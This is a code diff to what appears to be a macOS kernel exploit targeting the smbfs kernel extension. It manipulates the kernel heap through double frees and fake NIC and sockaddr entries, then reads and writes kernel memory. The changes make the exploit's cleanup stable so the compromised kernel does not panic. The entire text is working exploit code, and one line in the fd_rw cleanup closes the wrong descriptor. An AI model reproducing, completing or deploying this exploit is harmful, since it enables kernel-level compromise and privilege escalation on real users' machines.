@@ -25,6 +25,7 @@
 #include "memory/allocator_nrnw.h"
 #include "memory/kheap_alloc.h"
 #include "memory/kheap_free.h"
+#include "memory/safe_release.h"
 #include "smb/client.h"
 #include "smb/params.h"
 
@@ -123,6 +124,8 @@ static_assert(sizeof(struct smb_dev) == 48, "");
 #define NUM_SMB_DEV_CAPTURE_ALLOCS   512
 #define NUM_SMB_DEV_RECAPTURE_ALLOCS 512
 
+#define SMBFS_IDENTIFIER "com.apple.filesystems.smbfs"
+
 
 static const struct sockaddr_in6 SMB_DEV_CAPTURE_DATA = {
     .sin6_len = sizeof(struct sockaddr_in6),
@@ -134,6 +137,8 @@ static const struct sockaddr_in6 SMB_DEV_CAPTURE_DATA = {
 typedef struct smb_dev_rw_session_shared {
     _Atomic int ref_cnt;
     xe_kheap_free_session_t dbf_session;
+    kmem_allocator_prpw_t sockaddr_allocator;
+    kmem_allocator_prpw_t sock_addr_entry_allocator;
 } *smb_dev_rw_session_shared_t;
 
 
@@ -141,8 +146,11 @@ smb_dev_rw_session_shared_t smb_dev_rw_shared_session_create(xe_kheap_free_sessi
     struct smb_dev_rw_session_shared* session = malloc(sizeof(struct smb_dev_rw_session_shared));
     session->ref_cnt = 1;
     session->dbf_session = dbf_session;
+    session->sockaddr_allocator = NULL;
+    session->sock_addr_entry_allocator = NULL;
     return session;
 }
+
 
 smb_dev_rw_session_shared_t smb_dev_rw_shared_session_ref(smb_dev_rw_session_shared_t session) {
     int old = atomic_fetch_add(&session->ref_cnt, 1);
@@ -151,12 +159,34 @@ smb_dev_rw_session_shared_t smb_dev_rw_shared_session_ref(smb_dev_rw_session_sha
 }
 
 
+void smb_dev_rw_shared_session_destroy(smb_dev_rw_session_shared_t session) {
+    xe_slider_kext_t slider = xe_slider_kext_create(SMBFS_IDENTIFIER, XE_KC_BOOT);
+    xe_kheap_free_session_destroy(&session->dbf_session, slider);
+    if (session->sock_addr_entry_allocator) {
+        /// Patch the `client_nic_info_list` to prevent NICs from being released
+        kmem_allocator_prpw_iter_backends(session->sock_addr_entry_allocator, ^(int fd) {
+            xe_safe_release_reset_client_nics(fd, slider);
+        });
+        kmem_allocator_prpw_destroy(&session->sock_addr_entry_allocator);
+    }
+    if (session->sockaddr_allocator) {
+        /// Patch the `client_nic_info_list` to prevent NICs from being released
+        kmem_allocator_prpw_iter_backends(session->sockaddr_allocator, ^(int fd) {
+            xe_safe_release_reset_client_nics(fd, slider);
+        });
+        kmem_allocator_prpw_destroy(&session->sockaddr_allocator);
+    }
+    free(session);
+}
+
+
 void smb_dev_rw_shared_session_unref(smb_dev_rw_session_shared_t* sessionp) {
     smb_dev_rw_session_shared_t session = *sessionp;
     int old = atomic_fetch_sub(&session->ref_cnt, 1);
     if (old == 1) {
-        xe_kheap_free_session_destroy(&session->dbf_session);
-        free(session);
+        smb_dev_rw_shared_session_destroy(session);
+    } else {
+        xe_assert_cond(old, >, 1);
     }
     *sessionp = NULL;
 }
@@ -268,22 +298,29 @@ struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_
     
     /// `captured_smb_dev->sd_rwlock` should be a valid lck_rw_t
     if (captured_smb_dev.sd_rwlock.opaque[0] != 0x420000 || captured_smb_dev.sd_rwlock.opaque[1] != 0) {
-        return dev_rw;
+        goto bad;
     }
     
     if (!xe_vm_kernel_address_valid((uintptr_t)captured_smb_dev.sd_devfs)) {
-        return dev_rw;
+        goto bad;
     }
     
     if (captured_smb_dev.sd_session != NULL || captured_smb_dev.sd_share != NULL) {
-        return dev_rw;
+        goto bad;
     }
     
     if (captured_smb_dev.sd_flags != (NSMBFL_OPEN | NSMBFL_CANCEL)) {
-        return dev_rw;
+        goto bad;
     }
     
+    dev_rw->backup = captured_smb_dev;
     dev_rw->active = TRUE;
+    return dev_rw;
+    
+bad:
+    close(dev_rw->fd_dev);
+    dev_rw->fd_dev = -1;
+    dev_rw->active = FALSE;
     return dev_rw;
 }
 
@@ -359,7 +396,6 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     /// STEP 4: Construct a fake `struct complete_nic_info_entry` which can serve as a replacement
     /// for the leaked `dbf_nic`. This must also be a vailid tailq entry
     struct complete_nic_info_entry fake_nic = dbf_nic;
-//    fake_nic.next.next = NULL;
     /// Replace the `addr_list` tailq head with `fake_sock_addr_entry`
     fake_nic.addr_list.tqh_first = (struct sock_addr_entry*)fake_sock_addr_entry;
     fake_nic.addr_list.tqh_last = 0;
@@ -497,19 +533,35 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
         }
     }
     
-    xe_log_debug("smb_dev_rw created with %d active backends", num_active_devs);
-    smb_dev_rw_shared_session_unref(&session);
-    
     /// Release unused smb devices
     dispatch_apply(NUM_SMB_DEV_CAPTURE_ALLOCS, DISPATCH_APPLY_AUTO, ^(size_t idx) {
         if (capture_smb_devs[idx] >= 0) {
             close(capture_smb_devs[idx]);
         }
     });
+    
     kmem_allocator_rw_destroy(&capture_allocator);
-    kmem_allocator_prpw_destroy(&fake_sock_addr_entry_alloc.element_allocator);
-    kmem_allocator_prpw_destroy(&fake_sockaddr_alloc.element_allocator);
+    
+    if (sockaddr_found_index >= 0) {
+        kmem_allocator_prpw_destroy(&fake_sockaddr_alloc.element_allocator);
+    } else {
+        /// Fake sockaddr allocation is currently sharing memory with an unknown
+        /// allocated / free element in kext.48 zone. Releasing it now may panic
+        session->sockaddr_allocator = fake_sockaddr_alloc.element_allocator;
+    }
+    
+    if (sock_addr_entry_found_index >= 0) {
+        kmem_allocator_prpw_destroy(&fake_sock_addr_entry_alloc.element_allocator);
+    } else {
+        /// Fake sockaddr allocation is currently sharing memory with an unknown
+        /// allocated / free element in kext.48 zone. Releasing it now may panic
+        session->sock_addr_entry_allocator = fake_sock_addr_entry_alloc.element_allocator;
+    }
+    
     kmem_allocator_nrnw_destroy(&nrnw_allocator);
+    
+    xe_log_debug("smb_dev_rw created with %d active backends", num_active_devs);
+    smb_dev_rw_shared_session_unref(&session);
 }
 
 void smb_dev_rw_read_data(smb_dev_rw_t dev, struct smb_dev* out) {
@@ -628,47 +680,26 @@ uintptr_t smb_dev_rw_get_session(smb_dev_rw_t dev) {
     return (uintptr_t)smb_dev.sd_session;
 }
 
-
-uintptr_t smb_dev_rw_fd_to_dev(xe_slider_kext_t slider, int fd) {
-    struct stat dev_stat;
-    int res = fstat(fd, &dev_stat);
-    xe_assert_errno(res);
-    dev_t dev = dev_stat.st_dev;
-    
-    uintptr_t smb_dtab = xe_slider_kext_slide(slider, XE_KEXT_SEGMENT_DATA, KEXT_SMBFS_VAR_SMB_DTAB_DATA_OFFSET);
-    
-    return xe_kmem_read_ptr(smb_dtab, minor(dev) * sizeof(uintptr_t));
-}
-
-
 void smb_dev_rw_destroy(smb_dev_rw_t* rw_p) {
     smb_dev_rw_t rw = *rw_p;
     
     xe_slider_kext_t slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
     
     if (rw->fd_dev >= 0) {
-        struct smb_dev restore_dev;
-        restore_dev.sd_rwlock.opaque[0] = 0x420000;
-        restore_dev.sd_rwlock.opaque[1] = 0;
-        restore_dev.sd_devfs = rw->backup.sd_devfs;
-        restore_dev.sd_flags = NSMBFL_OPEN;
-        restore_dev.sd_share = NULL;
-        restore_dev.sd_session = NULL;
-        
-        uintptr_t smb_dev = smb_dev_rw_fd_to_dev(slider, rw->fd_dev);
-        xe_kmem_write(smb_dev, 0, &restore_dev, sizeof(restore_dev));
+        struct smb_dev restore;
+        bzero(&restore, sizeof(restore));
+        restore.sd_rwlock.opaque[0] = 0x420000;
+        restore.sd_rwlock.opaque[1] = 0;
+        restore.sd_devfs = rw->backup.sd_devfs;
+        restore.sd_flags = NSMBFL_OPEN;
+        restore.sd_share = NULL;
+        restore.sd_session = NULL;
+        xe_safe_release_restore_smb_dev(&rw->smb_addr, rw->fd_dev, &restore, rw->active, slider);
         close(rw->fd_dev);
     }
-    
+
     if (rw->fd_rw >= 0) {
-        uintptr_t smb_dev = smb_dev_rw_fd_to_dev(slider, rw->fd_rw);
-        uintptr_t smb_session = xe_kmem_read_ptr(smb_dev, offsetof(struct smb_dev, sd_session));
-        uintptr_t iod = xe_kmem_read_ptr(smb_session, TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET);
-        // TODO: only one of them will cause double free
-        xe_kmem_write_uint64(iod, offsetof(struct smbiod, iod_gss.gss_spn), 0);
-        xe_kmem_write_uint32(iod, offsetof(struct smbiod, iod_gss.gss_spn_len), 0);
-        xe_kmem_write_uint64(iod, offsetof(struct smbiod, iod_gss.gss_cpn), 0);
-        xe_kmem_write_uint32(iod, offsetof(struct smbiod, iod_gss.gss_cpn_len), 0);
+        xe_safe_release_reset_auth_info(rw->fd_rw, slider);
         close(rw->fd_dev);
     }
     
